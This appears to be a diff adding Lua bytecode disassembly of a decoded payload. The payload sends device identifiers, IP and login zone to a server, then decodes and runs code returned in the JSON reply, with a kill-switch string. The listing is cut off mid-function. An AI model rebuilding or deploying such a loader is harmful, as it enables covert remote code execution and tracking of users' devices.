+	36	[1]	JMP      	3	; to 40
+	37	[1]	GETUPVAL 	4 0	; h
+	38	[1]	GETTABLE 	4 4 -13	; "core_func_exit"
+	39	[1]	CALL     	4 1 1
+	40	[1]	EQ       	0 3 -14	; - "OK"
+	41	[1]	JMP      	21	; to 63
+	42	[1]	GETUPVAL 	4 0	; h
+	43	[1]	GETTABLE 	4 4 -4	; "def"
+	44	[1]	GETTABLE 	4 4 -5	; "debugkey"
+	45	[1]	TEST     	4 0 0
+	46	[1]	JMP      	4	; to 51
+	47	[1]	GETUPVAL 	4 0	; h
+	48	[1]	GETTABLE 	4 4 -6	; "print"
+	49	[1]	LOADK    	5 -15	; "same versions"
+	50	[1]	CALL     	4 2 1
+	51	[1]	GETUPVAL 	4 0	; h
+	52	[1]	GETTABLE 	4 4 -16	; "isloaded"
+	53	[1]	TEST     	4 0 1
+	54	[1]	JMP      	7	; to 62
+	55	[1]	GETUPVAL 	4 4	; L
+	56	[1]	CALL     	4 1 2
+	57	[1]	TEST     	4 0 1
+	58	[1]	JMP      	3	; to 62
+	59	[1]	GETUPVAL 	4 1	; S
+	60	[1]	GETUPVAL 	5 5	; e
+	61	[1]	CALL     	4 2 1
+	62	[1]	RETURN   	0 1
+	63	[1]	GETUPVAL 	4 0	; h
+	64	[1]	GETTABLE 	4 4 -17	; "require"
+	65	[1]	LOADK    	5 -18	; "cjson"
+	66	[1]	CALL     	4 2 2
+	67	[1]	GETTABLE 	5 4 -19	; "decode"
+	68	[1]	MOVE     	6 3
+	69	[1]	CALL     	5 2 2
+	70	[1]	TEST     	5 0 1
+	71	[1]	JMP      	12	; to 84
+	72	[1]	GETUPVAL 	6 0	; h
+	73	[1]	GETTABLE 	6 6 -4	; "def"
+	74	[1]	GETTABLE 	6 6 -5	; "debugkey"
+	75	[1]	TEST     	6 0 0
+	76	[1]	JMP      	4	; to 81
+	77	[1]	GETUPVAL 	6 0	; h
+	78	[1]	GETTABLE 	6 6 -6	; "print"
+	79	[1]	LOADK    	7 -20	; "json decode error"
+	80	[1]	CALL     	6 2 1
+	81	[1]	GETUPVAL 	6 1	; S
+	82	[1]	GETUPVAL 	7 5	; e
+	83	[1]	CALL     	6 2 1
+	84	[1]	GETTABLE 	6 5 -21	; "version"
+	85	[1]	TEST     	6 0 0
+	86	[1]	JMP      	3	; to 90
+	87	[1]	GETTABLE 	6 5 -22	; "content"
+	88	[1]	TEST     	6 0 1
+	89	[1]	JMP      	13	; to 103
+	90	[1]	GETUPVAL 	6 0	; h
+	91	[1]	GETTABLE 	6 6 -4	; "def"
+	92	[1]	GETTABLE 	6 6 -5	; "debugkey"
+	93	[1]	TEST     	6 0 0
+	94	[1]	JMP      	4	; to 99
+	95	[1]	GETUPVAL 	6 0	; h
+	96	[1]	GETTABLE 	6 6 -6	; "print"
+	97	[1]	LOADK    	7 -23	; "json format error"
+	98	[1]	CALL     	6 2 1
+	99	[1]	GETUPVAL 	6 1	; S
+	100	[1]	GETUPVAL 	7 5	; e
+	101	[1]	CALL     	6 2 1
+	102	[1]	RETURN   	0 1
+	103	[1]	GETUPVAL 	6 6	; D
+	104	[1]	GETTABLE 	7 5 -22	; "content"
+	105	[1]	CALL     	6 2 2
+	106	[1]	TEST     	6 0 1
+	107	[1]	JMP      	13	; to 121
+	108	[1]	GETUPVAL 	7 0	; h
+	109	[1]	GETTABLE 	7 7 -4	; "def"
+	110	[1]	GETTABLE 	7 7 -5	; "debugkey"
+	111	[1]	TEST     	7 0 0
+	112	[1]	JMP      	4	; to 117
+	113	[1]	GETUPVAL 	7 0	; h
+	114	[1]	GETTABLE 	7 7 -6	; "print"
+	115	[1]	LOADK    	8 -24	; "content decode error"
+	116	[1]	CALL     	7 2 1
+	117	[1]	GETUPVAL 	7 1	; S
+	118	[1]	GETUPVAL 	8 5	; e
+	119	[1]	CALL     	7 2 1
+	120	[1]	JMP      	28	; to 149
+	121	[1]	GETUPVAL 	7 7	; J
+	122	[1]	MOVE     	8 6
+	123	[1]	CALL     	7 2 3
+	124	[1]	TEST     	7 0 0
+	125	[1]	JMP      	7	; to 133
+	126	[1]	GETUPVAL 	9 8	; R
+	127	[1]	GETTABLE 	10 5 -22	; "content"
+	128	[1]	CALL     	9 2 1
+	129	[1]	GETUPVAL 	9 9	; Q
+	130	[1]	GETTABLE 	10 5 -21	; "version"
+	131	[1]	CALL     	9 2 1
+	132	[1]	JMP      	16	; to 149
+	133	[1]	GETUPVAL 	9 0	; h
+	134	[1]	GETTABLE 	9 9 -4	; "def"
+	135	[1]	GETTABLE 	9 9 -5	; "debugkey"
+	136	[1]	TEST     	9 0 0
+	137	[1]	JMP      	4	; to 142
+	138	[1]	GETUPVAL 	9 0	; h
+	139	[1]	GETTABLE 	9 9 -6	; "print"
+	140	[1]	LOADK    	10 -25	; "run code error"
+	141	[1]	CALL     	9 2 1
+	142	[1]	GETUPVAL 	9 1	; S
+	143	[1]	GETUPVAL 	10 5	; e
+	144	[1]	CALL     	9 2 1
+	145	[1]	JMP      	3	; to 149
+	146	[1]	GETUPVAL 	4 1	; S
+	147	[1]	GETUPVAL 	5 5	; e
+	148	[1]	CALL     	4 2 1
+	149	[1]	RETURN   	0 1
+constants (25) for <prototype-address-omitted>:
+	1	"name"
+	2	"completed"
+	3	"failed"
+	4	"def"
+	5	"debugkey"
+	6	"print"
+	7	"backup not ok"
+	8	"request"
+	9	"getResponseStatusCode"
+	10	"200"
+	11	"getResponseData"
+	12	"u7bTrcq508Ow19bttcfCvMb3"
+	13	"core_func_exit"
+	14	"OK"
+	15	"same versions"
+	16	"isloaded"
+	17	"require"
+	18	"cjson"
+	19	"decode"
+	20	"json decode error"
+	21	"version"
+	22	"content"
+	23	"json format error"
+	24	"content decode error"
+	25	"run code error"
+locals (9) for <prototype-address-omitted>:
+	0	W	1	149
+	1	X	21	149
+	2	Y	24	149
+	3	E	33	149
+	4	Z	67	145
+	5	_	70	145
+	6	K	106	145
+	7	N	124	145
+	8	O	124	145
+upvalues (10) for <prototype-address-omitted>:
+	0	h
+	1	S
+	2	T
+	3	j
+	4	L
+	5	e
+	6	D
+	7	J
+	8	R
+	9	Q
+
+function <core_dec_original_payload.lua:1,1> (31 instructions, 124 bytes at <prototype-address-omitted>)
+1 param, 5 slots, 1 upvalue, 2 locals, 9 constants, 0 functions
+	1	[1]	GETUPVAL 	1 0	; h
+	2	[1]	GETTABLE 	1 1 -1	; "device"
+	3	[1]	GETTABLE 	1 1 -2	; "writablePath"
+	4	[1]	LOADK    	2 -3	; "bzuuid"
+	5	[1]	CONCAT   	1 1 2
+	6	[1]	GETUPVAL 	2 0	; h
+	7	[1]	GETTABLE 	2 2 -4	; "io"
+	8	[1]	GETTABLE 	2 2 -5	; "exists"
+	9	[1]	MOVE     	3 1
+	10	[1]	CALL     	2 2 2
+	11	[1]	TEST     	2 0 1
+	12	[1]	JMP      	12	; to 25
+	13	[1]	GETUPVAL 	2 0	; h
+	14	[1]	GETTABLE 	2 2 -6	; "crypto"
+	15	[1]	GETTABLE 	2 2 -7	; "md5"
+	16	[1]	MOVE     	3 0
+	17	[1]	CALL     	2 2 2
+	18	[1]	MOVE     	0 2
+	19	[1]	GETUPVAL 	2 0	; h
+	20	[1]	GETTABLE 	2 2 -8	; "core_func_writefile"
+	21	[1]	MOVE     	3 1
+	22	[1]	MOVE     	4 0
+	23	[1]	CALL     	2 3 1
+	24	[1]	RETURN   	0 2
+	25	[1]	GETUPVAL 	2 0	; h
+	26	[1]	GETTABLE 	2 2 -4	; "io"
+	27	[1]	GETTABLE 	2 2 -9	; "readfile"
+	28	[1]	MOVE     	3 1
+	29	[1]	TAILCALL 	2 2 0
+	30	[1]	RETURN   	2 0
+	31	[1]	RETURN   	0 1
+constants (9) for <prototype-address-omitted>:
+	1	"device"
+	2	"writablePath"
+	3	"bzuuid"
+	4	"io"
+	5	"exists"
+	6	"crypto"
+	7	"md5"
+	8	"core_func_writefile"
+	9	"readfile"
+locals (2) for <prototype-address-omitted>:
+	0	a3	1	31
+	1	G	6	31
+upvalues (1) for <prototype-address-omitted>:
+	0	h
+
+function <core_dec_original_payload.lua:1,1> (113 instructions, 452 bytes at <prototype-address-omitted>)
+1 param, 22 slots, 16 upvalues, 8 locals, 32 constants, 2 functions
+	1	[1]	GETUPVAL 	1 0	; y
+	2	[1]	TEST     	0 0 0
+	3	[1]	JMP      	1	; to 5
+	4	[1]	LOADK    	1 -1	; "dirty"
+	5	[1]	GETUPVAL 	2 1	; h
+	6	[1]	GETTABLE 	2 2 -2	; "def"
+	7	[1]	GETTABLE 	2 2 -3	; "debugkey"
+	8	[1]	TEST     	2 0 0
+	9	[1]	JMP      	4	; to 14
+	10	[1]	GETUPVAL 	2 1	; h
+	11	[1]	GETTABLE 	2 2 -4	; "print"
+	12	[1]	GETUPVAL 	3 2	; k
+	13	[1]	CALL     	2 2 1
+	14	[1]	GETUPVAL 	2 1	; h
+	15	[1]	GETTABLE 	2 2 -5	; "core_func_createNet"
+	16	[1]	CLOSURE  	3 0	; <function-address-omitted>
+	17	[1]	GETUPVAL 	0 1	; h
+	18	[1]	GETUPVAL 	0 3	; S
+	19	[1]	GETUPVAL 	0 4	; d
+	20	[1]	GETUPVAL 	0 5	; j
+	21	[1]	GETUPVAL 	0 6	; L
+	22	[1]	GETUPVAL 	0 7	; a6
+	23	[1]	GETUPVAL 	0 8	; e
+	24	[1]	GETUPVAL 	0 9	; D
+	25	[1]	GETUPVAL 	0 10	; J
+	26	[1]	GETUPVAL 	0 11	; R
+	27	[1]	GETUPVAL 	0 12	; Q
+	28	[1]	GETUPVAL 	4 13	; B
+	29	[1]	GETUPVAL 	5 2	; k
+	30	[1]	CALL     	4 2 2
+	31	[1]	LOADK    	5 -6	; "POST"
+	32	[1]	CALL     	2 4 2
+	33	[1]	GETUPVAL 	3 1	; h
+	34	[1]	GETTABLE 	3 3 -7	; "ycFunction"
+	35	[1]	GETTABLE 	3 3 -8	; "getFileData"
+	36	[1]	GETUPVAL 	4 1	; h
+	37	[1]	GETTABLE 	4 4 -7	; "ycFunction"
+	38	[1]	LOADK    	5 -9	; "gplus.bin"
+	39	[1]	GETUPVAL 	6 8	; e
+	40	[1]	CALL     	3 4 3
+	41	[1]	CLOSURE  	5 1	; <function-address-omitted>
+	42	[1]	GETUPVAL 	0 1	; h
+	43	[1]	LOADK    	6 -10	; "smlt_"
+	44	[1]	MOVE     	7 5
+	45	[1]	GETUPVAL 	8 14	; g
+	46	[1]	GETUPVAL 	9 1	; h
+	47	[1]	GETTABLE 	9 9 -11	; "os"
+	48	[1]	GETTABLE 	9 9 -12	; "time"
+	49	[1]	CALL     	9 1 2
+	50	[1]	CONCAT   	8 8 9
+	51	[1]	CALL     	7 2 2
+	52	[1]	CONCAT   	6 6 7
+	53	[1]	LOADK    	7 -13	; "none"
+	54	[1]	GETUPVAL 	8 1	; h
+	55	[1]	GETTABLE 	8 8 -14	; "g_data"
+	56	[1]	GETTABLE 	8 8 -15	; "login"
+	57	[1]	GETTABLE 	8 8 -16	; "localLastSer"
+	58	[1]	TEST     	8 0 0
+	59	[1]	JMP      	17	; to 77
+	60	[1]	GETUPVAL 	8 1	; h
+	61	[1]	GETTABLE 	8 8 -14	; "g_data"
+	62	[1]	GETTABLE 	8 8 -15	; "login"
+	63	[1]	GETTABLE 	8 8 -16	; "localLastSer"
+	64	[1]	GETTABLE 	8 8 -17	; "zonename"
+	65	[1]	TEST     	8 0 0
+	66	[1]	JMP      	10	; to 77
+	67	[1]	GETUPVAL 	8 1	; h
+	68	[1]	GETTABLE 	8 8 -18	; "crypto"
+	69	[1]	GETTABLE 	8 8 -19	; "encodeBase64"
+	70	[1]	GETUPVAL 	9 1	; h
+	71	[1]	GETTABLE 	9 9 -14	; "g_data"
+	72	[1]	GETTABLE 	9 9 -15	; "login"
+	73	[1]	GETTABLE 	9 9 -16	; "localLastSer"
+	74	[1]	GETTABLE 	9 9 -17	; "zonename"
+	75	[1]	CALL     	8 2 2
+	76	[1]	MOVE     	7 8
+	77	[1]	GETTABLE 	8 2 -20	; "setPOSTData"
+	78	[1]	MOVE     	9 2
+	79	[1]	LOADK    	10 -21	; "ip="
+	80	[1]	GETUPVAL 	11 1	; h
+	81	[1]	GETTABLE 	11 11 -18	; "crypto"
+	82	[1]	GETTABLE 	11 11 -19	; "encodeBase64"
+	83	[1]	GETUPVAL 	12 15	; w
+	84	[1]	CALL     	11 2 2
+	85	[1]	LOADK    	12 -22	; "&uid="
+	86	[1]	MOVE     	13 6
+	87	[1]	LOADK    	14 -23	; "&code="
+	88	[1]	MOVE     	15 4
+	89	[1]	LOADK    	16 -24	; "&key="
+	90	[1]	GETUPVAL 	17 1	; h
+	91	[1]	GETTABLE 	17 17 -18	; "crypto"
+	92	[1]	GETTABLE 	17 17 -25	; "decodeBase64"
+	93	[1]	GETUPVAL 	18 1	; h
+	94	[1]	GETTABLE 	18 18 -2	; "def"
+	95	[1]	GETTABLE 	18 18 -26	; "role"
+	96	[1]	GETTABLE 	18 18 -27	; "stuff"
+	97	[1]	CALL     	17 2 2
+	98	[1]	LOADK    	18 -28	; "&version="
+	99	[1]	MOVE     	19 1
+	100	[1]	LOADK    	20 -29	; "&zone="
+	101	[1]	MOVE     	21 7
+	102	[1]	CONCAT   	10 10 21
+	103	[1]	CALL     	8 3 1
+	104	[1]	GETTABLE 	8 2 -30	; "setTimeout"
+	105	[1]	MOVE     	9 2
+	106	[1]	GETUPVAL 	10 5	; j
+	107	[1]	LOADK    	11 -31	; "6"
+	108	[1]	CALL     	10 2 0
+	109	[1]	CALL     	8 0 1
+	110	[1]	GETTABLE 	8 2 -32	; "start"
+	111	[1]	MOVE     	9 2
+	112	[1]	CALL     	8 2 1
+	113	[1]	RETURN   	0 1
+constants (32) for <prototype-address-omitted>:
+	1	"dirty"
+	2	"def"
+	3	"debugkey"
+	4	"print"
+	5	"core_func_createNet"
+	6	"POST"
+	7	"ycFunction"
+	8	"getFileData"
+	9	"gplus.bin"
+	10	"smlt_"
+	11	"os"
+	12	"time"
+	13	"none"
+	14	"g_data"
+	15	"login"
+	16	"localLastSer"
+	17	"zonename"
+	18	"crypto"
+	19	"encodeBase64"
+	20	"setPOSTData"
+	21	"ip="
+	22	"&uid="
+	23	"&code="
+	24	"&key="
+	25	"decodeBase64"
+	26	"role"
+	27	"stuff"
+	28	"&version="
+	29	"&zone="
+	30	"setTimeout"
+	31	"6"
+	32	"start"
+locals (8) for <prototype-address-omitted>:
+	0	T	1	113
+	1	U	2	113
+	2	X	33	113
+	3	a0	41	113
+	4	a1	41	113
+	5	a2	43	113
+	6	a4	53	113
+	7	a5	54	113
+upvalues (16) for <prototype-address-omitted>:
+	0	y
+	1	h
+	2	k
+	3	S
+	4	d
+	5	j
+	6	L
+	7	a6
+	8	e
+	9	D
+	10	J
+	11	R
+	12	Q
+	13	B
+	14	g
+	15	w
+
+function <core_dec_original_payload.lua:1,1> (159 instructions, 636 bytes at <prototype-address-omitted>)
+1 param, 11 slots, 11 upvalues, 9 locals, 25 constants, 0 functions
+	1	[1]	GETTABLE 	1 0 -1	; "name"
+	2	[1]	EQ       	1 1 -2	; - "completed"
+	3	[1]	JMP      	25	; to 29
+	4	[1]	GETUPVAL 	1 0	; h
+	5	[1]	GETTABLE 	1 1 -3	; "def"
+	6	[1]	GETTABLE 	1 1 -4	; "debugkey"
+	7	[1]	TEST     	1 0 0
+	8	[1]	JMP      	4	; to 13
+	9	[1]	GETUPVAL 	1 0	; h
+	10	[1]	GETTABLE 	1 1 -5	; "print"
+	11	[1]	GETTABLE 	2 0 -1	; "name"
+	12	[1]	CALL     	1 2 1
+	13	[1]	GETTABLE 	1 0 -1	; "name"
+	14	[1]	EQ       	0 1 -6	; - "failed"
+	15	[1]	JMP      	12	; to 28
+	16	[1]	GETUPVAL 	1 0	; h
+	17	[1]	GETTABLE 	1 1 -3	; "def"
+	18	[1]	GETTABLE 	1 1 -4	; "debugkey"
+	19	[1]	TEST     	1 0 0
+	20	[1]	JMP      	4	; to 25
+	21	[1]	GETUPVAL 	1 0	; h
+	22	[1]	GETTABLE 	1 1 -5	; "print"
+	23	[1]	LOADK    	2 -7	; "not ok"
+	24	[1]	CALL     	1 2 1
+	25	[1]	GETUPVAL 	1 1	; S
+	26	[1]	GETUPVAL 	2 2	; d
+	27	[1]	CALL     	1 2 1
+	28	[1]	RETURN   	0 1
+	29	[1]	GETTABLE 	1 0 -8	; "request"
+	30	[1]	GETTABLE 	2 1 -9	; "getResponseStatusCode"
+	31	[1]	MOVE     	3 1
+	32	[1]	CALL     	2 2 2
+	33	[1]	GETUPVAL 	3 3	; j
+	34	[1]	LOADK    	4 -10	; "200"
+	35	[1]	CALL     	3 2 2
+	36	[1]	EQ       	1 2 3
+	37	[1]	JMP      	1	; to 39
+	38	[1]	RETURN   	0 1
+	39	[1]	GETTABLE 	3 1 -11	; "getResponseData"
+	40	[1]	MOVE     	4 1
+	41	[1]	CALL     	3 2 2
+	42	[1]	TEST     	3 0 0
+	43	[1]	JMP      	112	; to 156
+	44	[1]	EQ       	0 3 -12	; - "u7bTrcq508Ow19bttcfCvMb3"
+	45	[1]	JMP      	4	; to 50
+	46	[1]	GETUPVAL 	4 0	; h
+	47	[1]	GETTABLE 	4 4 -13	; "core_func_exit"
+	48	[1]	CALL     	4 1 1
+	49	[1]	RETURN   	0 1
+	50	[1]	EQ       	0 3 -14	; - "OK"
+	51	[1]	JMP      	21	; to 73
+	52	[1]	GETUPVAL 	4 0	; h
+	53	[1]	GETTABLE 	4 4 -3	; "def"
+	54	[1]	GETTABLE 	4 4 -4	; "debugkey"
+	55	[1]	TEST     	4 0 0
+	56	[1]	JMP      	4	; to 61
+	57	[1]	GETUPVAL 	4 0	; h
+	58	[1]	GETTABLE 	4 4 -5	; "print"
+	59	[1]	LOADK    	5 -15	; "same version"
+	60	[1]	CALL     	4 2 1
+	61	[1]	GETUPVAL 	4 0	; h
+	62	[1]	GETTABLE 	4 4 -16	; "isloaded"
+	63	[1]	TEST     	4 0 1
+	64	[1]	JMP      	7	; to 72
+	65	[1]	GETUPVAL 	4 4	; L
+	66	[1]	CALL     	4 1 2
+	67	[1]	TEST     	4 0 1
+	68	[1]	JMP      	3	; to 72
+	69	[1]	GETUPVAL 	4 5	; a6
+	70	[1]	GETUPVAL 	5 6	; e
+	71	[1]	CALL     	4 2 1
+	72	[1]	RETURN   	0 1
+	73	[1]	GETUPVAL 	4 0	; h
+	74	[1]	GETTABLE 	4 4 -17	; "require"
+	75	[1]	LOADK    	5 -18	; "cjson"
+	76	[1]	CALL     	4 2 2
+	77	[1]	GETTABLE 	5 4 -19	; "decode"
+	78	[1]	MOVE     	6 3
+	79	[1]	CALL     	5 2 2
+	80	[1]	TEST     	5 0 1
+	81	[1]	JMP      	12	; to 94
+	82	[1]	GETUPVAL 	6 0	; h
+	83	[1]	GETTABLE 	6 6 -3	; "def"
+	84	[1]	GETTABLE 	6 6 -4	; "debugkey"
+	85	[1]	TEST     	6 0 0
+	86	[1]	JMP      	4	; to 91
+	87	[1]	GETUPVAL 	6 0	; h
+	88	[1]	GETTABLE 	6 6 -5	; "print"
+	89	[1]	LOADK    	7 -20	; "json decode error"
+	90	[1]	CALL     	6 2 1
+	91	[1]	GETUPVAL 	6 1	; S
+	92	[1]	GETUPVAL 	7 6	; e
+	93	[1]	CALL     	6 2 1
+	94	[1]	GETTABLE 	6 5 -21	; "version"
+	95	[1]	TEST     	6 0 0
+	96	[1]	JMP      	3	; to 100
+	97	[1]	GETTABLE 	6 5 -22	; "content"
+	98	[1]	TEST     	6 0 1
+	99	[1]	JMP      	13	; to 113
+	100	[1]	GETUPVAL 	6 0	; h
+	101	[1]	GETTABLE 	6 6 -3	; "def"
+	102	[1]	GETTABLE 	6 6 -4	; "debugkey"
+	103	[1]	TEST     	6 0 0
+	104	[1]	JMP      	4	; to 109
+	105	[1]	GETUPVAL 	6 0	; h
+	106	[1]	GETTABLE 	6 6 -5	; "print"
+	107	[1]	LOADK    	7 -23	; "json format error"
+	108	[1]	CALL     	6 2 1
+	109	[1]	GETUPVAL 	6 1	; S
+	110	[1]	GETUPVAL 	7 6	; e
+	111	[1]	CALL     	6 2 1
+	112	[1]	RETURN   	0 1
+	113	[1]	GETUPVAL 	6 7	; D
+	114	[1]	GETTABLE 	7 5 -22	; "content"
+	115	[1]	CALL     	6 2 2
+	116	[1]	TEST     	6 0 1
+	117	[1]	JMP      	13	; to 131
+	118	[1]	GETUPVAL 	7 0	; h
+	119	[1]	GETTABLE 	7 7 -3	; "def"
+	120	[1]	GETTABLE 	7 7 -4	; "debugkey"
+	121	[1]	TEST     	7 0 0
+	122	[1]	JMP      	4	; to 127
+	123	[1]	GETUPVAL 	7 0	; h
+	124	[1]	GETTABLE 	7 7 -5	; "print"
+	125	[1]	LOADK    	8 -24	; "content decode error"
+	126	[1]	CALL     	7 2 1
+	127	[1]	GETUPVAL 	7 1	; S
+	128	[1]	GETUPVAL 	8 6	; e
+	129	[1]	CALL     	7 2 1
+	130	[1]	JMP      	28	; to 159
+	131	[1]	GETUPVAL 	7 8	; J
+	132	[1]	MOVE     	8 6
+	133	[1]	CALL     	7 2 3
+	134	[1]	TEST     	7 0 0
+	135	[1]	JMP      	7	; to 143
+	136	[1]	GETUPVAL 	9 9	; R
+	137	[1]	GETTABLE 	10 5 -22	; "content"
+	138	[1]	CALL     	9 2 1
+	139	[1]	GETUPVAL 	9 10	; Q
+	140	[1]	GETTABLE 	10 5 -21	; "version"
+	141	[1]	CALL     	9 2 1
+	142	[1]	JMP      	16	; to 159
+	143	[1]	GETUPVAL 	9 0	; h
+	144	[1]	GETTABLE 	9 9 -3	; "def"
+	145	[1]	GETTABLE 	9 9 -4	; "debugkey"
+	146	[1]	TEST     	9 0 0
+	147	[1]	JMP      	4	; to 152
+	148	[1]	GETUPVAL 	9 0	; h
+	149	[1]	GETTABLE 	9 9 -5	; "print"
+	150	[1]	LOADK    	10 -25	; "run code error"
+	151	[1]	CALL     	9 2 1
+	152	[1]	GETUPVAL 	9 1	; S
+	153	[1]	GETUPVAL 	10 6	; e
+	154	[1]	CALL     	9 2 1
+	155	[1]	JMP      	3	; to 159
+	156	[1]	GETUPVAL 	4 1	; S
+	157	[1]	GETUPVAL 	5 6	; e
+	158	[1]	CALL     	4 2 1
+	159	[1]	RETURN   	0 1
+constants (25) for <prototype-address-omitted>:
+	1	"name"
+	2	"completed"
+	3	"def"
+	4	"debugkey"
+	5	"print"
+	6	"failed"
+	7	"not ok"
+	8	"request"
+	9	"getResponseStatusCode"
+	10	"200"
+	11	"getResponseData"
+	12	"u7bTrcq508Ow19bttcfCvMb3"
+	13	"core_func_exit"
+	14	"OK"
+	15	"same version"
+	16	"isloaded"
+	17	"require"
+	18	"cjson"
+	19	"decode"
+	20	"json decode error"
+	21	"version"
+	22	"content"
+	23	"json format error"
+	24	"content decode error"
+	25	"run code error"
+locals (9) for <prototype-address-omitted>:
+	0	a7	1	159
+	1	X	30	159
+	2	Y	33	159
+	3	E	42	159
+	4	Z	77	155
+	5	_	80	155
+	6	K	116	155
+	7	N	134	155
+	8	O	134	155
+upvalues (11) for <prototype-address-omitted>:
+	0	h
+	1	S
+	2	d
+	3	j
+	4	L
+	5	a6
+	6	e
+	7	D
+	8	J
+	9	R
+	10	Q
+
+function <core_dec_original_payload.lua:1,1> (31 instructions, 124 bytes at <prototype-address-omitted>)
+1 param, 5 slots, 1 upvalue, 2 locals, 9 constants, 0 functions
+	1	[1]	GETUPVAL 	1 0	; h
+	2	[1]	GETTABLE 	1 1 -1	; "device"
+	3	[1]	GETTABLE 	1 1 -2	; "writablePath"
+	4	[1]	LOADK    	2 -3	; "bzuuid"
+	5	[1]	CONCAT   	1 1 2
+	6	[1]	GETUPVAL 	2 0	; h
+	7	[1]	GETTABLE 	2 2 -4	; "io"
+	8	[1]	GETTABLE 	2 2 -5	; "exists"
+	9	[1]	MOVE     	3 1
+	10	[1]	CALL     	2 2 2
+	11	[1]	TEST     	2 0 1
+	12	[1]	JMP      	12	; to 25
+	13	[1]	GETUPVAL 	2 0	; h
+	14	[1]	GETTABLE 	2 2 -6	; "crypto"
+	15	[1]	GETTABLE 	2 2 -7	; "md5"
+	16	[1]	MOVE     	3 0
+	17	[1]	CALL     	2 2 2
+	18	[1]	MOVE     	0 2
+	19	[1]	GETUPVAL 	2 0	; h
+	20	[1]	GETTABLE 	2 2 -8	; "core_func_writefile"
+	21	[1]	MOVE     	3 1
+	22	[1]	MOVE     	4 0
+	23	[1]	CALL     	2 3 1
+	24	[1]	RETURN   	0 2
+	25	[1]	GETUPVAL 	2 0	; h
+	26	[1]	GETTABLE 	2 2 -4	; "io"
+	27	[1]	GETTABLE 	2 2 -9	; "readfile"
+	28	[1]	MOVE     	3 1
+	29	[1]	TAILCALL 	2 2 0
+	30	[1]	RETURN   	2 0
+	31	[1]	RETURN   	0 1
+constants (9) for <prototype-address-omitted>:
+	1	"device"
+	2	"writablePath"
+	3	"bzuuid"
+	4	"io"
+	5	"exists"
+	6	"crypto"
+	7	"md5"
+	8	"core_func_writefile"
+	9	"readfile"
+locals (2) for <prototype-address-omitted>:
+	0	a3	1	31
+	1	G	6	31
+upvalues (1) for <prototype-address-omitted>:
+	0	h
+
+function <core_dec_original_payload.lua:1,1> (15 instructions, 60 bytes at <prototype-address-omitted>)
+0 params, 3 slots, 1 upvalue, 0 locals, 6 constants, 0 functions
+	1	[1]	NEWTABLE 	0 0 3
+	2	[1]	GETUPVAL 	1 0	; j
+	3	[1]	LOADK    	2 -2	; "0.5"
+	4	[1]	CALL     	1 2 2
+	5	[1]	SETTABLE 	0 -1 1	; "phase_shift" -
+	6	[1]	GETUPVAL 	1 0	; j
+	7	[1]	LOADK    	2 -4	; "2.302585093"
+	8	[1]	CALL     	1 2 2
+	9	[1]	SETTABLE 	0 -3 1	; "exp_factor" -
+	10	[1]	GETUPVAL 	1 0	; j
+	11	[1]	LOADK    	2 -6	; "36"
+	12	[1]	CALL     	1 2 2
+	13	[1]	SETTABLE 	0 -5 1	; "char_offset" -
+	14	[1]	RETURN   	0 2
+	15	[1]	RETURN   	0 1
+constants (6) for <prototype-address-omitted>:
+	1	"phase_shift"
+	2	"0.5"
+	3	"exp_factor"
+	4	"2.302585093"
+	5	"char_offset"
+	6	"36"
+locals (0) for <prototype-address-omitted>:
+upvalues (1) for <prototype-address-omitted>:
+	0	j
+
+function <core_dec_original_payload.lua:1,1> (109 instructions, 436 bytes at <prototype-address-omitted>)
+0 params, 19 slots, 8 upvalues, 7 locals, 27 constants, 0 functions
+	1	[1]	GETUPVAL 	0 0	; ad
+	2	[1]	CALL     	0 1 2
+	3	[1]	GETUPVAL 	1 1	; a8
+	4	[1]	GETUPVAL 	2 2	; a9
+	5	[1]	GETTABLE 	3 0 -1	; "exp_factor"
+	6	[1]	CALL     	2 2 0
+	7	[1]	CALL     	1 0 2
+	8	[1]	GETUPVAL 	2 3	; h
+	9	[1]	GETTABLE 	2 2 -2	; "math"
+	10	[1]	GETTABLE 	2 2 -3	; "pi"
+	11	[1]	GETUPVAL 	3 4	; j
+	12	[1]	LOADK    	4 -4	; "3.1415926535"
+	13	[1]	CALL     	3 2 2
+	14	[1]	SUB      	2 2 3
+	15	[1]	GETTABLE 	3 0 -5	; "phase_shift"
+	16	[1]	ADD      	2 2 3
+	17	[1]	MUL      	2 1 2
+	18	[1]	GETUPVAL 	3 1	; a8
+	19	[1]	GETUPVAL 	4 4	; j
+	20	[1]	LOADK    	5 -6	; "0.5"
+	21	[1]	CALL     	4 2 2
+	22	[1]	MUL      	4 2 4
+	23	[1]	GETUPVAL 	5 4	; j
+	24	[1]	LOADK    	6 -7	; "100"
+	25	[1]	CALL     	5 2 2
+	26	[1]	MUL      	4 4 5
+	27	[1]	CALL     	3 2 2
+	28	[1]	GETUPVAL 	4 4	; j
+	29	[1]	LOADK    	5 -8	; "10"
+	30	[1]	CALL     	4 2 2
+	31	[1]	GETUPVAL 	5 4	; j
+	32	[1]	LOADK    	6 -8	; "10"
+	33	[1]	CALL     	5 2 2
+	34	[1]	MUL      	4 4 5
+	35	[1]	GETUPVAL 	5 4	; j
+	36	[1]	LOADK    	6 -9	; "2"
+	37	[1]	CALL     	5 2 2
+	38	[1]	MUL      	4 4 5
+	39	[1]	MUL      	5 3 4
+	40	[1]	GETUPVAL 	6 5	; aa
+	41	[1]	MOVE     	7 5
+	42	[1]	CALL     	6 2 2
+	43	[1]	GETUPVAL 	7 6	; ac
+	44	[1]	GETUPVAL 	8 7	; ab
+	45	[1]	GETUPVAL 	9 1	; a8
+	46	[1]	GETUPVAL 	10 4	; j
+	47	[1]	LOADK    	11 -8	; "10"
+	48	[1]	CALL     	10 2 2
+	49	[1]	DIV      	10 6 10
+	50	[1]	CALL     	9 2 2
+	51	[1]	GETUPVAL 	10 4	; j
+	52	[1]	LOADK    	11 -10	; "36"
+	53	[1]	CALL     	10 2 2
+	54	[1]	GETTABLE 	11 0 -11	; "char_offset"
+	55	[1]	ADD      	10 10 11
+	56	[1]	GETUPVAL 	11 4	; j
+	57	[1]	LOADK    	12 -12	; "72"
+	58	[1]	CALL     	11 2 2
+	59	[1]	GETUPVAL 	12 4	; j
+	60	[1]	LOADK    	13 -13	; "15"
+	61	[1]	CALL     	12 2 2
+	62	[1]	SUB      	11 11 12
+	63	[1]	GETUPVAL 	12 4	; j
+	64	[1]	LOADK    	13 -14	; "57"
+	65	[1]	CALL     	12 2 2
+	66	[1]	GETUPVAL 	13 4	; j
+	67	[1]	LOADK    	14 -15	; "25"
+	68	[1]	CALL     	13 2 2
+	69	[1]	ADD      	12 12 13
